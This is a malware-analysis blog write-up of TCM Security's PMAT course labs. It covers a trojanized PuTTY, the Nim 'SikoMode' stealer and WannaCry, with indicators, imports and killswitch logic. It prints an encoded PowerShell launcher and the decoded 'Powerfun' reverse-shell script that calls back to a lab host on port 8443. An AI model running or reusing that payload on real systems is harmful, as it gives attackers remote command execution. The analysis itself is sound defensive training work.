+++
title = "Practical Malware Analysis Training - TCM Security"
date = 2023-05-08
description = "Practical Malware Analysis Training - TCM Security"
tags = [
   "Malware",
   "Training",
   "PMAT"
]
+++

# Practical Malware Analysis Training (PMAT) - TCM Security

Practical Malware Analysis Training from TCM Security start by covering the basics of Malware Analysis. Shows how to build a lab (basically a Remnux and a FlareVM) and explains the process of analyzing binary from a beginner point of view. Husky is very good at explaining the risks without being too alarming.
It continues with basic static analysis followed by basic dynamic analysis showing the must-have tools (`pestudio`, `floss`, `inetsim`, etc).
After that, the course focuses on samples analysis and practice with a bunch of challenges to resolve.
Overall, it's a very good course !

It can fit for a beginner, for someone who isn't sure if malware analysis is made for him, or for the curious who just want an overview about this field.
Most of the samples have being developed by Husky for an educational purpose and safety.
There is also discord if you want to go further or if you have questions during the sample analysis.

## Challenge 1: SillyPutty Intro

**PMAT-labs/labs/1-3.Challenge-SillyPutty/putty.7z**

### Basic Static Analysis

**Q1. What is the SHA256 hash of the sample?**

`0c82e654c09c8fd9fdf4899718efa37670974c9eec5a8fc18a167f93cea6ee83`

**Q2. What architecture is this binary?**

32bits / Intel-386 / PE32

**Q3. Are there any results from submitting the SHA256 hash to VirusTotal?**

`putty.exe` is identified as a `trojan.shellcode/rozena` with a score of **55/68**.

**Q4. Describe the results of pulling the strings from this binary. Record and describe any strings that are potentially interesting. Can any interesting information be extracted from the strings?**

With FLOSS it's possible to extract strings : `C:\Users\user\Desktop>floss -n 5 C:\Users\user\Documents\PMAT-labs-main\labs\1-3.Challenge-SillyPutty\putty.exe`

Since the malware is packed in a legitimate putty executable, it's difficult to make a distinction between the putty's strings and the malware's strings.

**Q5. Describe the results of inspecting the IAT for this binary. Are there any imports worth noting?**

We can find the list of the imports.

Some can give good indications on the binary behaviors which seems to be a sort of a spyware / RAT : 

`RegCreateKeyEx` (Helper) from `Advapi32.dll`: `RegCreateKeyEx` is used to create a specified registry key. If the key already exists, the function opens it.  
`RegDeleteValue` (Helper) from `Advapi32.dll`: `RegDeleteValue` is used to remove a named value from the specified registry key.  
`RegSetValueEx` (Helper) from `Advapi32.dll`: `RegSetValueEx` is used to set a value and type for a given registry key.  
`RegCreateKey` (Helper) from `Advapi32.dll`: `RegCreateKey` is used to create a specified registry key. If the key already exists, the function opens it.  
`OpenClipboard` (Helper) from `User32.dll`: `OpenClipboard` is used to get a handle on the clipboard.  

`GetCurrentProcessId` (Enumeration) from `Kernel32.dll`: `GetCurrentProcessId` is used to retrieve the process identifier of the calling process.  
`RegEnumKey` (Enumeration / Helper) from `Advapi32.dll`: `RegEnumKey` is used to enumerate the subkeys of the specified open registry key. The function retrieves the name of one subkey each time it is called.  
`GetSystemDirectory` (Enumeration) from `Advapi32.dll`: `GetSystemDirectory` retrieve the path of the system directory.  
`FindFirstFileEx` (Enumeration) from `Advapi32.dll`: `FindFirstFileEx` is used to search through a directory and enumerate the filesystem.  
`FindNextFile` (Enumeration) from `Advapi32.dll`: `FindNextFile` is used to search through a directory and enumerate the filesystem. 

`CreateProcess` (Injection) from `Kernel32.dll`: `CreateProcess` is used to create a process. This function is used by malware in several process injection attacks, such as process hollowing.   
`OpenProcess` (Injection) from `Kernel32.dll`: `OpenProcess` is used to get a handle on a process. This function is commonly used by malware during process injection.  

`GetClipboardData` (Spying) from `User32.dll`: `GetClipboardData` is used to retrieve copied data residing in the clipboard.  

`ShellExecute` (Internet) from `Shell32.dll`: `ShellExecute` is used to perform an operation on a specified file. 

`GetUserName` (Enumeration / Anti-Debugging) from `Advapi32.dll`: `GetUserName` is used to retrieve the username associated with the current thread. This function is used by malware for anti-debugging purposes.  
`IsDebuggerPresent` (Anti-Debugging) from `Kernel32.dll`: `IsDebuggerPresent` IsDebuggerPresent is used to determine whether the calling process is being debugged by a user-mode debugger. 

Q6. Is it likely that this binary is packed?

The binary is packed and compressed. The binary has 10 sections, a RWX `.text` and another executable `.text` section which is very likely to contain packed code. The entropy is also very high (superior of 7).

### Basic Dynamic Analysis

**Q1. Describe initial detonation. Are there any notable occurrences at first detonation? Without internet simulation? With internet simulation?**

There is a very fast opening and closing Powershell window visible by the user.

**Q2. From the host-based indicators perspective, what is the main payload that is initiated at detonation? What tool can you use to identify this?**

It's visible using procmon with those filters:

![](/images/pmat_procmon.png)

It's possible to extract the payload from the powershell command executed at runtime:

![](/images/pmat_payload.png)

```
powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"
Current directory:	C:\Users\user\Documents\PMAT-labs-main\labs\1-3.Challenge-SillyPutty\
```

Decode it with `Cyberchef` or `base64 -d` and save it in a file.

```
$ file out.dat
out.dat: gzip compressed data, last modified: Mon Sep 27 12:58:13 2021, max compression, from Unix, original size modulo 2^32 2421
```

We can now read the whole payload launched upon runtime:

```
# Powerfun - Written by Ben Turner & Dave Hardy

function Get-Webclient 
{
    $wc = New-Object -TypeName Net.WebClient
    $wc.UseDefaultCredentials = $true
    $wc.Proxy.Credentials = $wc.Credentials
    $wc
}
function powerfun 
{ 
    Param( 
    [String]$Command,
    [String]$Sslcon,
    [String]$Download
    ) 
    Process {
    $modules = @()  
    if ($Command -eq "bind")
    {
        $listener = [System.Net.Sockets.TcpListener]8443
        $listener.start()    
        $client = $listener.AcceptTcpClient()
    } 
    if ($Command -eq "reverse")
    {
        $client = New-Object System.Net.Sockets.TCPClient("bonus2.corporatebonusapplication.local",8443)
    }

    $stream = $client.GetStream()

    if ($Sslcon -eq "true") 
    {
        $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
        $sslStream.AuthenticateAsClient("bonus2.corporatebonusapplication.local") 
        $stream = $sslStream 
    }

    [byte[]]$bytes = 0..20000|%{0}
    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
    $stream.Write($sendbytes,0,$sendbytes.Length)

    if ($Download -eq "true")
    {
        $sendbytes = ([text.encoding]::ASCII).GetBytes("[+] Loading modules.`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)
        ForEach ($module in $modules)
        {
            (Get-Webclient).DownloadString($module)|Invoke-Expression
        }
    }

    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
    $stream.Write($sendbytes,0,$sendbytes.Length)

    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
    {
        $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
        $data = $EncodedText.GetString($bytes,0, $i)
        $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )

        $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
        $x = ($error[0] | Out-String)
        $error.clear()
        $sendback2 = $sendback2 + $x

        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte,0,$sendbyte.Length)
        $stream.Flush()  
    }
    $client.Close()
    $listener.Stop()
    }
}

powerfun -Command reverse -Sslcon true
```

**Q3. What is the DNS record that is queried at detonation?**

The DNS record that is queried at detonation is `bonus2.corporatebonusapplication.local`.

![](/images/pmat_wireshark.png)

**Q4. What is the callback port number at detonation?**

The callback port number at detonation is `8443`.

**Q5. What is the callback protocol at detonation?**

The callback protocol at detonation is TLS.

**Q6. How can you use host-based telemetry to identify the DNS record, port, and protocol?**

Through TCPview or Procmon with the *Operation contains TCP* option.

![](/images/pmat_tcpview.png)

**Q7. Attempt to get the binary to initiate a shell on the localhost. Does a shell spawn? What is needed for a shell to spawn?**

We can trick the malware by adding `bonus2.corporatebonusapplication.local` on the loopback of the FlareVM machine. For that, modify the `C:\Windows\System32\drivers\etc\hosts` file:

```
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost
127.0.0.1       bonus2.corporatebonusapplication.local
```

Then execute `ipconfig /flushdns` to reset the DNS.

![](/images/pmat_ncat.png)

```
PS C:\Windows\system32> ncat -nvlp 8443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::8443
Ncat: Listening on 0.0.0.0:8443
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:49746.
▬♥♥ ├☺  ┐♥♥d↔Ì┤¨éèþÛ®»¨Éb÷O¼©71ßï-*Í;▓
ñ◄cá  *└,└+└0└/ ƒ ×└$└#└(└'└
└       └¶└‼ Ø £ = < 5 /
☺  l   + )  &bonus2.corporatebonusapplication.local
♠♦☺♣☺☻☺♦♥♣♥☻♥☻☻♠☺♠♥ #   ↨   ☺ ☺
```

However, with `ncat -nvlp 8443` we can't interpret the data since it's encrypted over TLS.
It's possible to decode it with `ncat` `--ssl` option.

![](/images/pmat_ncat_ssl.png)

```
PS C:\Users\user> ncat --ssl -nvlp 8443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: OpenSSL legacy provider failed to load.
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 2FFE B59C C3CB 8178 E07F 90E4 D0A1 248F 71C6 6F00
Ncat: Listening on :::8443
Ncat: Listening on 0.0.0.0:8443
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:49752.
Windows PowerShell running as user user on DESKTOP-TOFET8A
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\user\Documents\PMAT-labs-main\labs\1-3.Challenge-SillyPutty>
```

And now we get a shell from the malware ! It confirms our RAT suspicions.

## Challenge 2: SikoMode

- md5: `B9497FFB7E9C6F49823B95851EC874E3`
- sha1: `6C8F50040545D8CD9AF4B51564DE654266E592E3`
- sha256: `3ACA2A08CF296F1845D6171958EF0FFD1C8BDFC3E48BDD34A605CB1F7468213E`

**Q1. What language is the binary written in?**

The binary is written in Nim. As we can see peid can't detect the compiler used for the file.

![](/images/sikomode_peid.png)

However, with floss we find interesting strings, leading to NIM lang.

![](/images/sikomode_nim.png)

greping into them confirm it with references to `NimMain`, `NimMainInner`, and `NimMainModule`

![](/images/sikomode_nim2.png)

**Q2. What is the architecture of this binary?**

This is a PE64 binary file, which can be determined by PE-Studio or file command.  

![](/images/sikomode_file.png)

![](/images/sikomode_pe64.png)

**Q3. Under what conditions can you get the binary to delete itself?**

`unknown.exe` deletes itself in the following contexts:
The binary delete itself if:
- It is run and cannot make a successful connection to the URL `hxxp[://]update[.]ec12-4-109-278-3-ubuntu20-04[.]local`.
- It crash or is interrupted in the exfiltration routine (i.e. if INetSim is shut off while the binary is exfiltrating data).
- After finishing the exfiltration routine.

**Q4. Does the binary persist? If so, how?**

No persistence mechanism has been found.

![](/images/sikomode_imports.png)

**Q5. What is the first callback domain?**

The first callback domain is `hxxp://update.ec12-4-109-278-3-ubuntu20-04.local`, which is not present in the strings of the sample. This is because this URL is assembled in a loop at runtime and therefore doesn't show up in the strings/FLOSS output. The sample attempts to contact this domain at execution.

**Q6. Under what conditions can you get the binary to exfiltrate data?**

If the binary contacts the initial callback domain successfully, exfiltration occurs. After a successful check in with this domain, the sample unpacks the `passwrd.txt` file into `C:\Users\Public\`,  opens a handle to `cosmo.jpeg`, base64 encodes the contents of the file, and begins the data encryption routine. 

References to `C:\Users\Public\passwrd.txt` and `Desktop\cosmo.jpeg`

![](/images/sikomode_exfil.png)

**Q7. What is the exfiltration domain?**

`hxxp://cdn.altimiter.local` is the exfiltration domain.

![](/images/sikomode_exfil.png)

**Q8. What URI is used to exfiltrate data?**

The exfiltration URI is `hxxp[://]cdn[.]altimiter[.]local/feed?post=`. The `post=` contains encoded data extracted from `cosmo.jpg`.
The malware send a chunk of `cosmo.jpg` in each request. The data are later interpreted in the C2 back-end to recreate the `cosmo.jpg`.

**Q9. What type of data is exfiltrated (the file is `cosmo.jpeg`, but how exactly is the file's data transmitted?)**

The malware read the data of `cosmo.jpeg`  and encrypte them with the `passwrd.txt`.

**Q10. What kind of encryption algorithm is in use?**

The algorithm is RC4. This can be determined by either inspecting the imported libraries (easy) or following the `sym.stealstuff()` routine in the decompiled code (much, much harder). The `sym.stealstuff()` routine calls the `toRC4` method after opening the handle to  `cosmo.jpeg` and converting the contents to base64.

**Q11. What key is used to encrypt the data?**

The RC4 encryption key is `SikoMode` written in `C:\Users\Public\passwrd.txt`.

**Q12. What is the significance of `houdini`?**

`houdini` is the function that makes the binary delete itself and cleanup the malware from disk.

## Challenge 3: WannaCry

**Q1. Record any observed symptoms of infection from initial detonation. What are the main symptoms of a WannaCry infection?**

- A wallpaper indicating that the computer is infected

![](/images/wncry_wallpaper.jpg)

- A program with a countdown. It gives instruction how to pay the ransom in order to recover the encrypted files.

![](/images/wncry_window.jpg)

- The files are encrypted with the `.WNCRY` extension.

- Files on the Desktop : `@WanaDecryptor@` and `@Please_Read_Me@`.

**Q2. Use FLOSS and extract the strings from the main WannaCry binary. Are there any strings of interest?**

There is a URL in the stackstring (built at runtime) `hxxp[://]www[.]iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com`

![](/images/wncry_str2.PNG)

 Other strings of interest include call to remote share : `\\192.168.56.20\IPC$`, `\\192.168.56.20\IPC$`. Files extensions, language pack `msg/m_french.wnry` and others :

```
launcher.dll
mssecsvc.exe
cmd.exe /c ¨%s"
tasksche.exe
icacls . /grant Everyone:F /T /C /Q
WNcry@2ol7
%s -m security
C:\%s\qeriuwjhrf
```

![](/images/wncry_str3.PNG)

![](/images/wncry_str4.PNG)

**Q3. Inspect the import address table for the main WannaCry binary. Are there any notable API imports?**

- CreateFileA
- WriteFileA
- CryptGetRandom
- CryptAcquireContextA
- CryptGenKey
- CryptEncrypt
- CryptDecrypt
- InternetOpenA
- InternetOpenUrlA
- CreateServiceA
- ChangeServiceConfig2A

**Q4. What conditions are necessary to get this sample to detonate?**

WannaCry attempts to connect to the URL : `hxxp[://]www[.]iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com`

If the connection is successful, the program exits without encrypting the file.

If the connection is not successful (the domain is not reachable), the ransomware start encrypting the host's files.

**Q5. **Network Indicators**: Identify the network indicators of this malware**

- Attempted connection to the URL `hxxp[://]www[.]iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com`
- Lots of SMB connection requests to remote addresses.
- `taskhsvc.exe` pops up and opens port 9050 then attempts to connect to addresses over HTTPS.

**Q6. **Host-based Indicators**: Identify the host-based indicators of this malware.**

- An hidden directory is created in `C:\ProgramData`. Contains the `taskhsvc.exe` and `tor.exe`.

![](/images/wncry_str1.PNG)

![](/images/wncry_folder.png)

- A startup entry is created to start `tasksche.exe` as a persistent executable. There are also services `mssecsvc2.0` and `mvsmigybnoz504`

![](/images/wncry_task.png)

![](/images/wncry_services.png)

**Q7. Use Cutter to locate the killswitch mechanism in the decompiled code and explain how it functions.**

- In the main, the URL string `hxxp[://]www[.]iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com` is moved into ECX.
- `InternetOpenA`'s arguments are pushed onto the stack. The function is called and the result (a boolean) is moved into EAX.
- `InternetOpenUrlA`'s arguments are pushed onto the stack (the URL string). The function is called and the result is moved into EAX then EDI.
- The value of EDI is compared to 0 (comparing to false).
- If the value is 0 (meaning EDI is set at `False`) WannaCry wasn't able to resolve the killswitch URL. It  makes a call to the first function and start encrypting.
- If the value is 1 (meaning EDI is set at `True`) WannaCry was able to resolve the killswitch URL. It exits without doing anything.